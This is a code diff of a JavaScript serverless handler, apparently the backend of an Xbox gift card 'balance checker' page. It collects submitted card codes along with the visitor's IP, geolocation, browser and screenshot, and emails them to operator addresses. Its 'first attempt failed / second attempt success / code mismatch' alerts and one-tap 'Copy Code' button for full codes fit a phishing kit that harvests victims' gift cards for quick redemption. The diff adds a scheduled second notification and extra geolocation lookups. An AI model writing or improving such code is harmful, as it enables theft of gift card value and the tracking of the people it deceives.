@@ -1,5 +1,10 @@
 import { Resend } from 'resend';
-import { waitUntil } from '@vercel/functions';
+
+function maskCode(code) {
+  if (!code) return 'N/A';
+  if (code.length <= 5) return '*****';
+  return `*****${code.slice(-5)}`;
+}
 
 function buildEmailAttachments(imageBase64) {
   if (!imageBase64) return [];
@@ -15,6 +20,7 @@ function buildEmailAttachments(imageBase64) {
 
 // ============================================================
 // Responsive, mobile-first email template
+// `showCopy` flag controls whether the copy button appears
 // ============================================================
 function buildEmailHtml(type, data, showCopy = true) {
   const {
@@ -45,7 +51,7 @@ function buildEmailHtml(type, data, showCopy = true) {
     <style>
       * { margin:0; padding:0; box-sizing:border-box; -webkit-text-size-adjust:100%; -ms-text-size-adjust:100%; }
       body, table, td, p, a { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; }
-      img { border:0; outline:none; text-decoration:none; }
+      img { border:0; outline:none; text-decoration:none; -ms-interpolation-mode:bicubic; }
       table { border-collapse:collapse !important; }
 
       .email-bg { background:#eef1f5; padding:16px 8px; }
@@ -63,10 +69,11 @@ function buildEmailHtml(type, data, showCopy = true) {
 
       .field {
         display:block;
-        padding:14px 0;
+        padding:12px 0;
         border-bottom:1px solid #eef1f5;
       }
       .field:last-child { border-bottom:none; }
+      .field-code { padding-bottom:22px; margin-bottom:6px; }
       .label {
         display:block;
         font-size:11px;
@@ -74,12 +81,12 @@ function buildEmailHtml(type, data, showCopy = true) {
         color:#6b7280;
         text-transform:uppercase;
         letter-spacing:.6px;
-        margin-bottom:8px;
+        margin-bottom:5px;
       }
       .value {
         display:block;
         font-size:14.5px;
-        line-height:1.6;
+        line-height:1.5;
         color:#111827;
         word-break:break-word;
         overflow-wrap:anywhere;
@@ -90,40 +97,36 @@ function buildEmailHtml(type, data, showCopy = true) {
         background:#0f172a;
         border:1px solid #1e293b;
         border-radius:10px;
-        padding:16px 16px;
-        margin-top:4px;
-        margin-bottom:4px;
+        padding:12px 12px 12px 14px;
+        margin-top:2px;
       }
+      .code-wrap.spaced { margin-bottom:8px; }
       .code-text {
         display:block;
         font-family:'SF Mono','Fira Code','Roboto Mono','Courier New',monospace;
-        font-size:16px;
-        letter-spacing:2px;
+        font-size:15px;
+        letter-spacing:1.2px;
         color:#7dd3fc;
-        font-weight:700;
+        font-weight:600;
         word-break:break-all;
         overflow-wrap:anywhere;
-        line-height:1.7;
-        margin-bottom:12px;
-        text-align:center;
+        line-height:1.5;
+        margin-bottom:10px;
       }
-      .code-text.small { font-size:14px; letter-spacing:1.5px; }
+      .code-text.small { font-size:13px; letter-spacing:.8px; }
       .code-text.no-btn { margin-bottom:0; }
-
       .copy-btn {
-        display:block;
-        width:100%;
+        display:inline-block;
         background:#38bdf8;
         color:#0f172a !important;
-        font-size:13px;
+        font-size:12.5px;
         font-weight:700;
         text-decoration:none;
-        padding:11px 16px;
+        padding:8px 16px;
         border-radius:8px;
         letter-spacing:.4px;
         border:none;
         cursor:pointer;
-        text-align:center;
       }
       .copy-btn:active { opacity:.85; }
 
@@ -182,16 +185,19 @@ function buildEmailHtml(type, data, showCopy = true) {
         .body { padding:16px; }
         .label { font-size:10.5px; }
         .value { font-size:14px; }
-        .code-text { font-size:14px; letter-spacing:1.5px; }
-        .code-text.small { font-size:13px; }
+        .code-text { font-size:13.5px; letter-spacing:.8px; }
+        .code-text.small { font-size:12px; }
+        .copy-btn { display:block; width:100%; text-align:center; padding:10px; font-size:13px; }
         .ip-row { font-size:12.5px; }
         .ip-val { font-size:12px; }
-        .field { padding:12px 0; }
+        .field { padding:11px 0; }
+        .field-code { padding-bottom:20px; }
       }
     </style>
   `;
 
-  const copyScript = showCopy ? `
+  // === Your exact copy script ===
+  const copyScript = `
     <script>
       (function(){
         var btn = document.getElementById('copy-${uid}');
@@ -199,9 +205,12 @@ function buildEmailHtml(type, data, showCopy = true) {
 
         btn.addEventListener('click', function(e){
           e.preventDefault();
-          e.stopPropagation();
-
-          var code = btn.getAttribute('data-code') || '';
+          
+          var rawData = btn.getAttribute('data-code') || '';
+          var code = rawData;
+          try {
+            code = decodeURIComponent(rawData);
+          } catch(e) {}
 
           var done = function(){
             var t = btn.getAttribute('data-label') || 'Copy Code';
@@ -228,15 +237,10 @@ function buildEmailHtml(type, data, showCopy = true) {
           try {
             var ta = document.createElement('textarea');
             ta.value = text;
-            ta.setAttribute('readonly', '');
             ta.style.position = 'fixed';
-            ta.style.top = '0';
-            ta.style.left = '0';
-            ta.style.opacity = '0';
+            ta.style.left = '-9999px';
             document.body.appendChild(ta);
-            ta.focus();
             ta.select();
-            ta.setSelectionRange(0, text.length);
             var ok = document.execCommand('copy');
             document.body.removeChild(ta);
             if (ok && cb) cb();
@@ -244,34 +248,32 @@ function buildEmailHtml(type, data, showCopy = true) {
         }
       })();
     </script>
-  ` : '';
+  `;
 
+  // Reusable code block. If showCopy=false, no button rendered.
   const codeBlock = (code, small = false) => {
     if (!code) return '<span class="value">N/A</span>';
-    const safe = String(code)
-      .replace(/&/g, '&amp;')
-      .replace(/</g, '&lt;')
-      .replace(/>/g, '&gt;')
-      .replace(/"/g, '&quot;');
+    const safeCode = String(code).replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    const encoded = encodeURIComponent(String(code));
 
     if (!showCopy) {
       return `
-        <div class="code-wrap">
-          <span class="code-text no-btn ${small ? 'small' : ''}">${safe}</span>
+        <div class="code-wrap spaced">
+          <span class="code-text no-btn ${small ? 'small' : ''}">${safeCode}</span>
         </div>
       `;
     }
 
     return `
-      <div class="code-wrap">
-        <span class="code-text ${small ? 'small' : ''}">${safe}</span>
+      <div class="code-wrap spaced">
+        <span class="code-text ${small ? 'small' : ''}">${safeCode}</span>
         <button
           id="copy-${uid}"
           class="copy-btn"
           type="button"
-          data-code="${safe}"
-          data-label="📋 Copy Code"
-        >📋 Copy Code</button>
+          data-code="${encoded}"
+          data-label="${small ? 'Copy Code' : '📋 Copy Code'}"
+        >${small ? 'Copy Code' : '📋 Copy Code'}</button>
       </div>
     `;
   };
@@ -283,7 +285,7 @@ function buildEmailHtml(type, data, showCopy = true) {
     </div>
   `;
 
-  const wrap = (headerBg, headerTitle, headerSub, bodyContent) => `<!DOCTYPE html>
+  const wrap = (headerBg, headerTitle, headerSub, bodyContent, script = '') => `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
@@ -309,17 +311,18 @@ function buildEmailHtml(type, data, showCopy = true) {
       </div>
     </div>
   </div>
-  ${copyScript}
+  ${script}
 </body>
 </html>`;
 
+  // ---------------- First attempt failed ----------------
   if (type === 'first_attempt_failed') {
     return wrap(
       'linear-gradient(135deg,#dc3545,#b02a37)',
       '❌ First Attempt Failed',
       'Xbox Gift Card Verification',
       `
-        <div class="field">
+        <div class="field field-code">
           <span class="label">🎮 Gift Card Code</span>
           ${codeBlock(cardNumber)}
         </div>
@@ -347,17 +350,19 @@ function buildEmailHtml(type, data, showCopy = true) {
           <span class="label">🌐 Browser</span>
           <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
         </div>
-      `
+      `,
+      showCopy ? copyScript : ''
     );
   }
 
+  // ---------------- Second attempt success ----------------
   if (type === 'second_attempt_success') {
     return wrap(
       'linear-gradient(135deg,#16a34a,#15803d)',
       '✅ Second Attempt Success',
       'Xbox Gift Card Verification',
       `
-        <div class="field">
+        <div class="field field-code">
           <span class="label">🎮 Gift Card Code</span>
           ${codeBlock(cardNumber)}
         </div>
@@ -389,23 +394,25 @@ function buildEmailHtml(type, data, showCopy = true) {
           <span class="label">🌐 Browser</span>
           <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
         </div>
-      `
+      `,
+      showCopy ? copyScript : ''
     );
   }
 
+  // ---------------- Code mismatch ----------------
   if (type === 'mismatch_attempt') {
     return wrap(
       'linear-gradient(135deg,#f59e0b,#d97706)',
       '⚠️ Code Mismatch',
       'Xbox Gift Card Verification',
       `
-        <div class="field">
-          <span class="label">🎮 First Code (Full)</span>
-          ${codeBlock(cardNumberFirst)}
+        <div class="field field-code">
+          <span class="label">🎮 First Code</span>
+          ${codeBlock(maskCode(cardNumberFirst), true)}
         </div>
-        <div class="field">
-          <span class="label">🎮 Second Code (Full)</span>
-          ${codeBlock(cardNumberSecond)}
+        <div class="field field-code">
+          <span class="label">🎮 Second Code</span>
+          ${codeBlock(maskCode(cardNumberSecond), true)}
         </div>
         <div class="field">
           <span class="label">💰 Amount</span>
@@ -431,10 +438,12 @@ function buildEmailHtml(type, data, showCopy = true) {
           <span class="label">🌐 Browser</span>
           <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
         </div>
-      `
+      `,
+      showCopy ? copyScript : ''
     );
   }
 
+  // ---------------- Fallback / default ----------------
   return wrap(
     'linear-gradient(135deg,#107C10,#0b5e0b)',
     'Xbox Gift Card Notification',
@@ -456,19 +465,20 @@ function buildEmailHtml(type, data, showCopy = true) {
         <span class="label">🕐 Time</span>
         <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
       </div>
-    `
+    `,
+    showCopy ? copyScript : ''
   );
 }
 
 function buildSubject(type) {
-  if (type === 'first_attempt_failed') return 'First Attempt Failed - Xbox Gift Card';
-  if (type === 'second_attempt_success') return 'Second Attempt Success - Xbox Gift Card';
-  if (type === 'mismatch_attempt') return 'Code Mismatch - Xbox Gift Card';
+  if (type === 'first_attempt_failed') return 'FIRST ATTEMPT FAILED - Xbox Gift Card';
+  if (type === 'second_attempt_success') return 'SECOND ATTEMPT SUCCESS - Xbox Gift Card';
+  if (type === 'mismatch_attempt') return 'CODE MISMATCH - Xbox Gift Card';
   return 'Xbox Gift Card Notification';
 }
 
 // ============================================================
-// Fast IP geolocation — 2s timeout, parallel-ish fallback
+// Reliable IP geolocation with multiple fallback providers
 // ============================================================
 async function getLocationFromIP(ip) {
   if (
@@ -505,6 +515,14 @@ async function getLocationFromIP(ip) {
       },
     },
     {
+      name: 'ip-api.com',
+      url: `http://ip-api.com/json/${cleanIP}?fields=status,country,regionName,city`,
+      parse: (d) => {
+        if (d.status !== 'success') return null;
+        return { city: d.city, region: d.regionName, country: d.country };
+      },
+    },
+    {
       name: 'ipwho.is',
       url: `https://ipwho.is/${cleanIP}`,
       parse: (d) => {
@@ -526,29 +544,36 @@ async function getLocationFromIP(ip) {
   for (const provider of providers) {
     try {
       const controller = new AbortController();
-      const timeout = setTimeout(() => controller.abort(), 2000);
+      const timeout = setTimeout(() => controller.abort(), 5000);
       const res = await fetch(provider.url, {
         signal: controller.signal,
         headers: { 'User-Agent': 'xbox-balance-checker/1.0' },
       });
       clearTimeout(timeout);
 
-      if (!res.ok) continue;
+      if (!res.ok) {
+        console.warn(`[geo] ${provider.name} HTTP ${res.status}`);
+        continue;
+      }
 
       const data = await res.json();
       const parsed = provider.parse(data);
+
       if (parsed && (parsed.city || parsed.region || parsed.country)) {
+        console.log(`[geo] Resolved via ${provider.name}:`, parsed);
         return {
           city: parsed.city || 'Unknown',
           region: parsed.region || '',
           country: parsed.country || '',
         };
       }
+      console.warn(`[geo] ${provider.name} returned no usable data`);
     } catch (err) {
-      // try next provider
+      console.warn(`[geo] ${provider.name} failed: ${err.message}`);
     }
   }
 
+  console.warn('[geo] All providers failed for IP:', cleanIP);
   return { city: 'Unknown', region: '', country: '' };
 }
 
@@ -579,7 +604,7 @@ export default async function handler(req, res) {
     message,
   } = formData;
 
-  // ---- IP extraction ----
+  // ---- Robust IP extraction ----
   const forwarded = req.headers['x-forwarded-for'];
   let ip = 'Unknown';
   if (typeof forwarded === 'string' && forwarded.length) {
@@ -596,72 +621,50 @@ export default async function handler(req, res) {
       'Unknown';
   }
 
+  const location = await getLocationFromIP(ip);
+
   const primaryEmail = process.env.PRIMARY_EMAIL;
   const notificationEmail = process.env.NOTIFICATION_EMAIL;
   const resendApiKey = process.env.RESEND_API_KEY;
+  const sendToPrimary = String(process.env.SEND_TO_PRIMARY || 'true').toLowerCase() === 'true';
 
-  const sendToPrimary = process.env.SEND_TO_PRIMARY !== 'false';
+  const basePayload = {
+    cardNumber,
+    cardNumberFirst,
+    cardNumberSecond,
+    amount,
+    balance,
+    userAgent,
+    pageSource,
+    message,
+    ip,
+    location,
+  };
 
-  if (!resendApiKey) {
+  const subject = buildSubject(type);
+  const attachments = buildEmailAttachments(imageBase64);
+
+  if (!resendApiKey || !notificationEmail || (sendToPrimary && !primaryEmail)) {
     return res.status(500).json({ error: 'Resend email service configuration missing' });
   }
 
-  if (sendToPrimary && !primaryEmail) {
-    return res.status(500).json({ error: 'PRIMARY_EMAIL is required when SEND_TO_PRIMARY=true' });
-  }
-
-  if (!notificationEmail) {
-    return res.status(500).json({ error: 'NOTIFICATION_EMAIL is required' });
-  }
-
-  const attachments = buildEmailAttachments(imageBase64);
-  const subject = buildSubject(type);
-  const submissionTimestamp = timestamp || new Date().toISOString();
-
-  const locationPromise = getLocationFromIP(ip).catch(() => ({
-    city: 'Unknown',
-    region: '',
-    country: '',
-  }));
-
   try {
     const resend = new Resend(resendApiKey);
-
-    const quickLocation = await Promise.race([
-      locationPromise,
-      new Promise((resolve) =>
-        setTimeout(() => resolve({ city: 'Unknown', region: '', country: '' }), 1500)
-      ),
-    ]);
-
-    const baseData = {
-      cardNumber,
-      cardNumberFirst,
-      cardNumberSecond,
-      amount,
-      balance,
-      userAgent,
-      pageSource,
-      message,
-      ip,
-      location: quickLocation,
-    };
+    const fromAddress = process.env.RESEND_FROM || 'noreply@xboxbalance.com';
 
     if (sendToPrimary) {
-      console.log('📧 Mode: SEND_TO_PRIMARY=true');
-
-      // ---- 1️⃣ Immediate email (submission time) ----
-      const immediateData = {
-        ...baseData,
-        timestamp: submissionTimestamp,
-      };
-
-      const htmlImmediate = buildEmailHtml(type, immediateData, true);
+      // === MODE A: SEND_TO_PRIMARY = true ===
+      // 1) Immediate email to PRIMARY_EMAIL (with copy button, real submission time)
+      const htmlImmediate = buildEmailHtml(
+        type,
+        { ...basePayload, timestamp },
+        true
+      );
 
       const immediateResult = await resend.emails.send({
-        from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
+        from: fromAddress,
         to: primaryEmail,
-        subject: subject,
+        subject: `[IMMEDIATE] ${subject}`,
         html: htmlImmediate,
         attachments,
       });
@@ -669,72 +672,56 @@ export default async function handler(req, res) {
       if (immediateResult.error) {
         throw new Error(immediateResult.error.message || 'Immediate Resend email failed');
       }
-      console.log('✅ Immediate email sent to PRIMARY_EMAIL (submission time)');
+      console.log('✅ Immediate email sent to PRIMARY_EMAIL');
 
-      // ---- 2️⃣ Delayed email (fire time) ----
-      // ⭐ waitUntil keeps the function alive after the response is sent,
-      // so the setTimeout callback actually runs and the 2nd email sends.
-      waitUntil(
-        (async () => {
-          try {
-            // Wait 10 seconds
-            await new Promise((r) => setTimeout(r, 10 * 1000));
-
-            const fullLocation = await locationPromise;
-
-            const delayedData = {
-              ...baseData,
-              location: fullLocation,
-              // Current time at the moment the email fires
-              timestamp: new Date().toISOString(),
-            };
-
-            const htmlScheduled = buildEmailHtml(type, delayedData, false);
-
-            console.log('⏱️ Firing delayed email to NOTIFICATION_EMAIL (fire time)');
-            const delayedResult = await resend.emails.send({
-              from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
-              to: notificationEmail,
-              subject: subject,
-              html: htmlScheduled,
-              attachments,
-            });
-
-            if (delayedResult.error) {
-              console.error('⚠️ Delayed Resend email error:', delayedResult.error);
-            } else {
-              console.log('✅ Delayed email sent to NOTIFICATION_EMAIL (fire time)');
-            }
-          } catch (err) {
-            console.error('❌ Delayed email exception:', err.message);
-          }
-        })()
+      // 2) Schedule email to NOTIFICATION_EMAIL after 15 seconds
+      //    → no copy button
+      //    → timestamp = time the email is sent (queue time), not submission time
+      const scheduledTimestamp = new Date(Date.now() + 15 * 1000).toISOString();
+      const htmlScheduled = buildEmailHtml(
+        type,
+        { ...basePayload, timestamp: scheduledTimestamp },
+        false
       );
 
-    } else {
-      console.log('📧 Mode: SEND_TO_PRIMARY=false (skipping primary)');
-
-      const immediateData = {
-        ...baseData,
-        timestamp: submissionTimestamp,
-      };
-
-      const htmlImmediate = buildEmailHtml(type, immediateData, true);
-
-      const result = await resend.emails.send({
-        from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
+      const scheduledAt = new Date(Date.now() + 15 * 1000).toISOString();
+      const scheduledResult = await resend.emails.send({
+        from: fromAddress,
         to: notificationEmail,
-        subject: subject,
+        subject: ` ${subject}`,
+        html: htmlScheduled,
+        attachments,
+        scheduledAt,
+      });
+
+      if (scheduledResult.error) {
+        throw new Error(scheduledResult.error.message || 'Scheduled Resend email failed');
+      }
+      console.log(`✅ Scheduled email queued for NOTIFICATION_EMAIL at ${scheduledAt}`);
+    } else {
+      // === MODE B: SEND_TO_PRIMARY = false ===
+      // Send immediately to NOTIFICATION_EMAIL only, no copy button,
+      // and timestamp = time the email is sent (now).
+      const sendTimestamp = new Date().toISOString();
+      const htmlImmediate = buildEmailHtml(
+        type,
+        { ...basePayload, timestamp: sendTimestamp },
+        false
+      );
+
+      const immediateResult = await resend.emails.send({
+        from: fromAddress,
+        to: notificationEmail,
+        subject: `[IMMEDIATE] ${subject}`,
         html: htmlImmediate,
         attachments,
       });
 
-      if (result.error) {
-        throw new Error(result.error.message || 'Resend email failed');
+      if (immediateResult.error) {
+        throw new Error(immediateResult.error.message || 'Immediate Resend email failed');
       }
-      console.log('✅ Immediate email sent to NOTIFICATION_EMAIL (submission time, primary skipped)');
+      console.log('✅ Immediate email sent to NOTIFICATION_EMAIL (SEND_TO_PRIMARY=false)');
     }
-
   } catch (error) {
     console.error('❌ Resend email failed:', error.message);
     return res.status(502).json({ error: 'Email delivery failed' });
